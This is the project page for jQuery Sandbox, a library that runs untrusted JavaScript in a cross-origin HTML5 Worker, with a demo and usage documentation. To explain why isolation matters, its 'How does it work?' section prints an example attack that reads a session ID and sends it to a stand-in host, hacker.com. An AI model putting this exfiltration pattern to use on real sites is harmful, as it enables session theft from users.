<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>jQuery Sandbox</title>
<meta name="description" content="Execute untrusted headless Javascript code in a sandbox.">
<link href="//netdna.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css" rel="stylesheet" type="text/css">
<style type="text/css">
body
{
    background: white;
}

textarea
{
    -webkit-box-sizing: border-box; 
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    width: 100%;
    min-height: 380px;
    resize: vertical;
}

section
{
    margin-top: 50px;
}

.content
{
    margin-top: 60px;
    margin-bottom: 120px;
}

ol li
{
    margin-bottom: 25px;
}

label
{
    font-weight: bold;
}
</style>
</head>
<body>
<a href="https://github.com/ziyan/jquery-sandbox/"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_green_007200.png" alt="Fork me on GitHub"></a>

<div class="content container">
<article>
<header>
<h1>jQuery Sandbox</h1>
<p class="lead">Execute untrusted headless Javascript code in a sandbox.</p>
</header>


<section>
<h2>Demo</h2>
<div class="row">
<div class="col-md-6">
<p>Type some script to be executed in a sandbox. Your script will be terminated after 5 seconds.</p>
<br/>
<form class="form">
<fieldset class="control-group">
<label class="control-label" for="sandbox">Untrusted Javascript code</label>
<div class="controls">
<textarea id="sandbox">
// Provide some API for your data model so that your user can easily script.
// This part can be always loaded into the sandbox first.
var TwitterApi = {}
TwitterApi.tweet = function(content) {
    postMessage({
        action: 'tweet',
        content: content,
    });
};

// Now load user created scripts.
setInterval(function() {
    TwitterApi.tweet('I tweet once in a while.');
}, 1000);

var xhr = new XMLHttpRequest();
xhr.open('GET', 'worker.js', false);
xhr.send();
TwitterApi.tweet("I tweet the length of a js file: " + xhr.responseText.length);
</textarea>
</div>
</fieldset>
<div class="form-actions">
<button type="submit" class="btn btn-primary">Run in sandbox</button>
</div>
</form>
</div>
<div class="col-md-6">
<h3>Output</h3>
<p>This example will simply print out what the script has posted via <code>postMessage</code>. In your handler, you should sanitize these messages from the script and do something useful with them.</p>
<br/>
<div id="output"></div>
</div>
</div>
</section>

<section>
<h2>How does it work?</h2>
<div class="row">
<div class="col-md-6">
Quite simple, actually.
<br/><br/>
<ol>
<li>
<strong>jQuery Sandbox runs untrusted javascript in a HTML5 Worker which does not have access to the DOM.</strong>
This mechanism ensures that the script cannot manipulate elements in your DOM, read your cookie or annoy your visitors with popups.
However, it alone is not enough. Consider this attack:<br/><br/>
<pre class="prettyprint">
var xhr = new XMLHttpRequest();
xhr.open('GET', '/session_id', false);
xhr.send();
var session_id = xhr.responseText;
importScripts('http://hacker.com/track.js?session_id=' + session_id);
</pre>
</li>
<li>
<strong>The Worker is hosted on a different domain such that protection from browser's cross origin resource sharing (CORS) policy kicks in, further restricting malicious code.</strong>
This will ensure that the script cannot read your local storage, use XMLHttpRequest to steal cookie and other data from pages on your site. Malicious script can still access anything from our host domain, but we have nothing valuable.
</li>
</ol>
<br/><br/>
<h3>Installation</h3>
<p>You will need the latest jQuery and this script:</p>
<p><pre class="prettyprint">
&lt;script type="text/javascript" src="//ziyan.github.io/jquery-sandbox/0.0.1/jquery.sandbox.js"&gt;&lt;/script&gt;
</pre></p>
<p>The source can be found on github: <a href="https://github.com/ziyan/jquery-sandbox/blob/master/jquery.sandbox.js">https://github.com/ziyan/jquery-sandbox/blob/master/jquery.sandbox.js</a></p>
<p>Actually, the real source is in CoffeeScript: <a href="https://github.com/ziyan/jquery-sandbox/blob/master/src/js/jquery.sandbox.coffee">https://github.com/ziyan/jquery-sandbox/blob/master/src/js/jquery.sandbox.coffee</a></p>
<br/><br/>
<h3>Limitations</h3>
<p>Since jQuery Sandbox depends on HTML5 Worker, it will not work with IE[6-9]. However, it has been tested on the following browsers:
<ul>
    <li>IE 10.0</li>
    <li>Latest Chrome</li>
    <li>Latest Firefox</li>
</ul>
</p>
</div>
<div class="col-md-6">
<h3>Usage</h3>
<p>The script does nothing until you call it via <code>$.sandbox(options)</code>.</p>
<p><code>options</code> is a dictionary with the following keys:
<ul>
<li><strong>scripts</strong> - Array of script URLs to be executed. You can execute scripts stored in a string directly by supplying: <code>['data:application/javascript,' + encodeURIComponent(script)]</code></li>
<li><strong>url</strong> (optional) - Path to the sandbox iframe. Default to <code>//ziyan.github.io/jquery-sandbox/0.0.1/sandbox.html</code></li>
<li><strong>timeout</strong> (optional) - Number of seconds before killing the script. Default to <code>0</code> which means no timeout</li>
<li><strong>callback</strong> (optional) - Function to be called when the script does <code>postMessage()</code> or throws exception. Should be defined as <code>function(data, error) { ... }</code></li>
</ul>
</p>
<p><pre class="prettyprint">
var sandbox = $.sandbox({
    timeout: 5000,
    scripts: [
        '//yourdomain.com/assets/js/api.js',
        'data:application/javascript,' + encodeURIComponent(script1),
        'data:application/javascript,' + encodeURIComponent(script2),
    ],
    callback: function(data, error) {
        if (error !== undefined) this.terminate();
    }
});

$('a#terminate').click(function(e) {
    // Termination on demand.
    sandbox.terminate();
});
</pre></p>

</div>
</div>
</section>

</div>

<script type="text/javascript" src="//code.jquery.com/jquery-2.1.1.min.js"></script>
<script type="text/javascript" src="//netdna.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
<script type="text/javascript" src="//ziyan.github.io/jquery-sandbox/0.0.1/jquery.sandbox.js"></script>
<script type="text/javascript">
$(function() {
    window.prettyPrint && prettyPrint();

    var output = $('#output');
    if ($.support.sandbox) {
        message = $('<div class="alert alert-success"><strong>Awesome!</strong> Your browser does support HTML5 Worker, this should work.</div>');
        message.prependTo($('form:first'));
    }
    else {
        message = $('<div class="alert alert-error">Unfortunately, your browser does not support HTML5 Worker yet, thus jQuery Sandbox will not run.</div>');
        message.prependTo($('form:first'));
    }

    var sandbox = null;

    $('form:first').submit(function (e) {
        e.preventDefault();

        var script = $('textarea#sandbox').val();

        output.html('');

        if (sandbox) {
            sandbox.terminate();
            sandbox = null;
        }
        
        sandbox = $.sandbox({
            timeout: 5000,
            scripts: ['data:application/javascript,' + encodeURIComponent(script)],
            callback: function (data, error) {
                if (data) {
                    if (typeof(data) !== 'string') {
                        data = JSON.stringify(data);
                    }
                    $('<div />').addClass('alert alert-info').text(data).appendTo(output);
                    return;
                }
 
                if (error === 'timeout') {
                    $('<div />').addClass('alert alert-error').html('Script terminated due to reaching of time limit.').appendTo(output);
                    this.terminate();
                    sandbox = null;
                    return;
                }

                $('<div />').addClass('alert alert-error').html('Terminating script due to unknown error: ' + error).appendTo(output);
                this.terminate();
                sandbox = null;
            }
        });
    });
});
</script>
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-34085887-1', 'ziyan.net');
ga('send', 'pageview');
</script>
</body>
</html>
